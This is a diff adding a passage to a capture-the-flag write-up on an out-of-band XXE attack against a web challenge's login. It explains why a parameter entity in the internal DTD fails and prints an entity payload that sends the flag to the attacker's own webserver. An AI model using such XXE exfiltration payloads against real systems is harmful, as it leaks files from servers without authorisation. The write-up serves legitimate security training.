@@ -254,4 +254,12 @@ This should trigger the server to make a HTTP GET request to our webserver with 
 Let's quickly set up our webserver with `php -S 0.0.0.0:80`
 <img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/php-server.png">
 
-However, when we send that XML document to the server,
+However, when we send that XML document to the server the same old bland response `Username or password not found! Try Harder!` is sent back and no connection is received on our webserver. Why does this happen?
+
+Well according to the [World Wide Web Consortium's (W3C) recommendation on XML](https://www.w3.org/TR/2006/REC-xml-20060816/REC-xml-20060816.xml): parameter entity references must not occur within markup declarations in the internal DTD subset; However, that does not apply to references that occur in external parameter entities.
+<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/xml_specification.png">
+
+Our current exploit indeed does have parameter entity reference within a markup declaration in the internal DTD subset right here:
+`<!ENTITY % XXE "<!ENTITY exfil SYSTEM 'http://[IP REDACTED]/?flag=%flag;'>">`
+
+Luckily this does not affect external parameter entities, so we can just use an external DTD.
